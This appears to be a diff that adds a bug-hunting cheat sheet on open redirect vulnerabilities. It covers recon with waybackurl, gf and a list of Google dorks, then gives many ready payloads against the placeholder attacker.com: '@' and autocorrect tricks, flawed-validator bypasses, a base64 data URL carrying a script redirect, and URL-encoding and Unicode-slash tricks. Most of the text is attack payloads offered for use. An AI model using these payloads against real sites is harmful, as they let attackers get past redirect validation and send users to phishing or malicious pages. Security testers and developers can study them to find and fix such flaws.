@@ -1,0 +1,64 @@
+Fuzz and look for redirect, redir, next, next=/dashboard
+
+You can use waybackurl with gf tool to automate this task
+waybackurl example.com | gf <plugin of choice i prefer interestingparams | grep <the above keywords given>
+
+You can also leverage google dorks for automating this..
+
+inurl:redir site:example.com
+inurl:redirect site:example.com
+inurl:redirecturi site:example.com
+inurl:redirect_uri site:example.com
+inurl:redirecturl site:example.com
+inurl:redirect_uri site:example.com
+inurl:return site:example.com
+inurl:returnurl site:example.com
+inurl:relaystate site:example.com
+inurl:forward site:example.com
+inurl:forwardurl site:example.com
+inurl:forward_url site:example.com
+inurl:url site:example.com
+inurl:uri site:example.com
+inurl:dest site:example.com
+inurl:destination site:example.com
+inurl:next site:example.com
+
+Start testing by injecting a domain
+http://example.com/redir?=<attackerdomain>.com
+
+Bypasses
+using @ - scheme://user:password:port/example.com@attacker.com
+https://example.com/@attacker.com
+
+Using browser autocorrect
+
+https:attacker.com
+https;attacker.com
+https:\/\/attacker.com
+https:/\/\attacker.com
+
+Flawed validator
+https://example.com/login?redir=http://example.com.attacker.com
+https://example.com/login?redir=http://attacker.com/example.com
+https://example.com/login?redir=https://example.com@attacker.com/example.com
+
+Usind data urls
+data:text/html;base64,
+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
+decodes to <script>location="https://example.com"</script>
+
+https://example.com/login?redir=data:text/html;base64,
+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4
+
+You can use encoding to bypass like
+https://attacker.com%252f@example.com
+https://attacker.com%ff.example.com - %ff is the character ÿ, which is a non-ASCII character. The validator has
+determined that example.com is the domain name, and attacker.comÿ is the
+subdomain name. Several scenarios could happen. Sometimes browsers
+decode non-ASCII characters into question marks. 
+
+might work payload ;) = https://attacker.com╱.example.com
+
+You can combine the above bypass techniques in order to bypass the mitigations
+
+[BONUS] Soon I'll be making a tool which autoamtes all url redirect vulns with the bypass techiniques as choice. :)
